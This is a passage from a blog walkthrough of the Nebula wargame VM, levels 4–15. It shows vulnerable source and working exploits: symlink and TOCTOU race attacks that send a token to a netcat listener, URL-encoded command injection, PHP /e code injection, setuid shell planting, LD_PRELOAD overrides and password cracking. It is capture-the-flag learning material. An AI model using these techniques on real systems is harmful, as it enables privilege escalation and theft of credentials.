  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code tries to read the &lt;code&gt;token&lt;/code&gt; file which is read/write protected. We can bypass that by creating a symlink to the token and reading that instead.
The token file contains the password for the &lt;code&gt;flag04&lt;/code&gt; user.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level04@nebula:/home/flag04$ ln -s  /home/flag04/token /tmp/bypass
level04@nebula:/home/flag04$ ./flag04 /tmp/bypass
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level05:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level05&lt;/h3&gt;

&lt;h4 id=&#34;description-5:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has world readable backup file which contains the private key for the &lt;code&gt;flag05&lt;/code&gt; user. We can use it to ssh in as &lt;em&gt;flag05&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -al
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/backup/
level05@nebula:/home/flag05/.backup$ cd /tmp/backup/
level05@nebula:/tmp/backup$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp/backup$ cd .ssh
level05@nebula:/tmp/backup/.ssh$ ssh -i id_rsa flag05@localhost
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;localhost&#39; (ECDSA) to the list of known hosts.
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level06:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level06&lt;/h3&gt;

&lt;h4 id=&#34;description-6:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Upon closer inspection the &lt;code&gt;/etc/passwd&lt;/code&gt; file has DES hash for the flag06 user:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The VM itself does not have &lt;code&gt;john&lt;/code&gt; installed, so I cracked the password in my local Kali box (the password was &lt;code&gt;hello&lt;/code&gt;) and used it to get the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level06@nebula:~$ su flag06 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level07:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level07&lt;/h3&gt;

&lt;h4 id=&#34;description-7:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-3:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; }

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);
  
}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerable script is served via thttpd:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flag07    1169  0.0  0.1   2588   892 ?        Ss   Apr29   0:01 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it is running on port 7007.&lt;/p&gt;

&lt;p&gt;The perl source code has a command injection vulnerability. We can inject arbitrary commands into the &lt;code&gt;Host&lt;/code&gt; parameter.
I have chosen to reuse the setuid shell from previous levels (/tmp/shell).&lt;/p&gt;

&lt;p&gt;The url encoded exploit:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.56.101:7007/index.cgi?Host=localhost|cp%20/tmp/shell%20~%20%26%26%20chmod%204755%20~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which executes:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cp /tmp/shell ~ &amp;amp;&amp;amp; chmod 4755 ~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After that we can grab the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/home/flag07$ ls -l
total 13
-rwxr-xr-x 1 root   root    368 2011-11-20 21:22 index.cgi
-rwsr-xr-x 1 flag07 flag07 7322 2016-04-30 06:41 shell
-rw-r--r-- 1 root   root   3719 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag 
You have successfully executed getflag on a target account
flag07@nebula:/home/flag07$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level08:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level08&lt;/h3&gt;

&lt;h4 id=&#34;description-8:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has a world readable &lt;code&gt;capture.pcap&lt;/code&gt; file in flag08&amp;rsquo;s home folder. After SCPing it out and viewing it in wireshark,
we can extract the plaintext password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/05/01/wireshark.png&#34; alt=&#34;wireshark&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The password seen in the screenshot is &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, hoewever, the dots here are actually &lt;code&gt;0x7F&lt;/code&gt; characters (which is Backspace),
so the correct password is &lt;code&gt;backd00Rmate&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;With this password we can get the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level08@nebula:/home/flag08$ su flag08 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level09:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level09&lt;/h3&gt;

&lt;h4 id=&#34;description-9:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Thereâ€™s a C setuid wrapper for some vulnerable PHP codeâ€¦&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-4:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code has &lt;code&gt;preg_replace with /e modifier&lt;/code&gt; vulnerability.
Googling for details we find a post that details the exploitation &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;here&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;The vulnerability in our case can be exploited by passing commands via second parameter (which is unused in the code itself), or,
as described in the post, via first parameter&amp;rsquo;s file contents. The file contents in our case should look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email ${`shell commands`}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The full exploit (again reusing setuid shell):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ cat /tmp/phpshell 
[email ${`cp /tmp/shell /home/flag09/shell &amp;amp;&amp;amp; chmod 4755 /home/flag09/shell`}]

level09@nebula:/home/flag09$ ./flag09 /tmp/phpshell 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1


level09@nebula:/home/flag09$ ls -al
total 21
drwxr-x--- 1 flag09 level09   60 2016-05-01 01:20 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
-rwsr-xr-x 1 flag09 level09 7322 2016-05-01 01:20 shell
level09@nebula:/home/flag09$ ./shell
flag09@nebula:/home/flag09$ getflag 
You have successfully executed getflag on a target account
flag09@nebula:/home/flag09$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level10:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level10&lt;/h3&gt;

&lt;h4 id=&#34;description-10:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-5:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
      printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
      printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code is vulnerable to &amp;ldquo;time of check to time of use&amp;rdquo; race condition. It has its own wiki &lt;a href=&#34;https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use&#34;&gt;article&lt;/a&gt;.
The logic of the (SETUID) code here and the one in the article is basically the same - check if the current user has access to a file and if so - process the file.&lt;/p&gt;

&lt;p&gt;To exploit this, we need to first pass in the file that we have access to (to pass the check) and later switch it out (symlink) to another file (which we WANT to access).
The timing is crucial here and the race needs to be automated.
I wrote the following script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

rm -rf /tmp/access
touch /tmp/access
/home/flag10/flag10 /tmp/access 192.168.56.1 &amp;amp;
ln -sf /home/flag10/token /tmp/access
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a few attempts we receive the token to our netcat listener:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# nc -lkp 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back inside the Nebula VM:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level10@nebula:/home/flag10$ su flag10 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level11:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level11&lt;/h3&gt;

&lt;h4 id=&#34;description-11:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.
There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-6:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();
  
  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid,
      &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10),
      &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
      &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));
  
  if(length &amp;lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&amp;quot;pink = %d\n&amp;quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &amp;quot;mmap&amp;quot;);
      }
      process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The code reads data from stdin. In order to get code execution (reach the &lt;em&gt;process&lt;/em&gt; function) we need to satisfy a few input conditions. The first line should contain a valid header, which is
&amp;ldquo;Content-Length: &amp;ldquo; followed by the length value. Then, depending on the length value, one of two execution paths are taken. If length is &amp;lt;1024 the first path is taken.
This piece of code reads into a buffer:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;fread()&lt;/code&gt; function will always return 1 here, because by definition it returns number of &lt;em&gt;items&lt;/em&gt; read and not bytes read. So it looks like if we want to take the first execution path - our
workable buffer length is 1.&lt;/p&gt;

&lt;p&gt;If we test the program with a valid header and a buffer which only contains the &lt;code&gt;x&lt;/code&gt; char:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level11@nebula:~$ /home/flag11/flag11 
Content-Length: 1
x
sh: yP?: command not found
level11@nebula:~$ 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that we reach the &lt;code&gt;system()&lt;/code&gt; call and that the &lt;code&gt;x&lt;/code&gt; char was decoded to &lt;code&gt;y&lt;/code&gt;. The additional random chars are there due to inability to properly null terminate our buffer, but
executing with the same buffer a few times we can reach a point where the second char will &lt;em&gt;randomly&lt;/em&gt; be a null terminator.
So now we can get code execution:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level11@nebula:~$ cat y
getflag

level11@nebula:~$ export PATH=~:$PATH
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: yp!: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: $&#39;y0\314&#39;: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: $&#39;y\260\356&#39;: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
getflag is executing on a non-flag account, this doesn&#39;t count
level11@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We manage to execute &lt;code&gt;getflag&lt;/code&gt;, but it complains about the user id. There are no user id manipulations in the code prior to calling &lt;em&gt;system()&lt;/em&gt;, so I think there is a bug in this level.&lt;/p&gt;

&lt;h3 id=&#34;level12:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level12&lt;/h3&gt;

&lt;h4 id=&#34;decription:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Decription:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-7:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password)
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
      local h = hash(line)

      if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
          client:send(&amp;quot;Better luck next time\n&amp;quot;);
      else
          client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
      end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The listener expects a password which is hashed (SHA1) and compared to a hardcoded value. The way the hash is calculated is vulnerable
to command injection:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level12@nebula:/home/flag12$ nc localhost 50001
Password: test
Better luck next time
level12@nebula:/home/flag12$ nc localhost 50001
Password: test; getflag &amp;gt; /tmp/flag.txt; test
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/flag.txt 
You have successfully executed getflag on a target account
level12@nebula:/home/flag12$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level13:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level13&lt;/h3&gt;

&lt;h4 id=&#34;description-12:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-8:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
      printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);
  
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For this level we can override the &lt;code&gt;getuid()&lt;/code&gt;function using the &lt;code&gt;LD_PRELOAD&lt;/code&gt; &lt;a href=&#34;https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&#34;&gt;trick&lt;/a&gt;. The original binary is setuid - which means that it discards the LD_PRELOAD variable. So this technique does not work for privilege escalation in our case, but instead can be used to divert execution path without modifying the binary itself.
For this to work, we need to copy the executable somewhere else:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level13@nebula:~$ cat uid.c
#include &amp;lt;unistd.h&amp;gt;
uid_t getuid()
{
     return 1000;
}
level13@nebula:~$ gcc -fPIC uid.c -shared -o uid.so
level13@nebula:~$ LD_PRELOAD=~/uid.so /home/flag13/flag13 
Security failure detected. UID 1014 started us, we expect 1000
The system administrators will be notified of this violation
level13@nebula:~$ cp /home/flag13/flag13 /tmp/flag13
level13@nebula:~$ LD_PRELOAD=/home/level13/uid.so /tmp/flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ su flag13 -
Password: 
sh-4.2$ id
uid=986(flag13) gid=986(flag13) groups=986(flag13)
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level14:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level14&lt;/h3&gt;

&lt;h4 id=&#34;description-13:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;No source code was provided for this level. So here we must analyze the binary itself and deduce how it encrypts the provided input.
By passing several test strings we can test how the binary works:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level14@nebula:/home/flag14$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./flag14 -e
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefg1level14@nebula:/home/flag14$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we can see that each character in the string is shifted according to its possition (index). The 0th &lt;code&gt;A&lt;/code&gt; is shifted by 0, 1st - by 1, 2nd - by 2, and so on.
A quick python script should reverse this process and decrypt the token:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
level14@nebula:/home/flag14$ cat /tmp/decrypt.py 
import sys

encrypted = &#39;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&#39;
plaintext = &#39;&#39;
for i in xrange(len(encrypted)):
    char = chr(ord(encrypted[i]) - i)
    plaintext += char

print plaintext
level14@nebula:/home/flag14$ python /tmp/decrypt.py 
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ su flag14 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level15:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level15&lt;/h3&gt;

&lt;h4 id=&#34;description-14:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to â€œcompile a shared library in linuxâ€ and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Stracing the flag15 binary shows a bunch of reads of &lt;code&gt;libc.so.6&lt;/code&gt; library inside various folders inside &lt;code&gt;/var/tmp/flag15&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:~$ strace /home/flag15/flag15 
execve(&amp;quot;/home/flag15/flag15&amp;quot;, [&amp;quot;/home/flag15/flag15&amp;quot;], [/* 18 vars */]) = 0
brk(0)                                  = 0x8685000
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a7000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
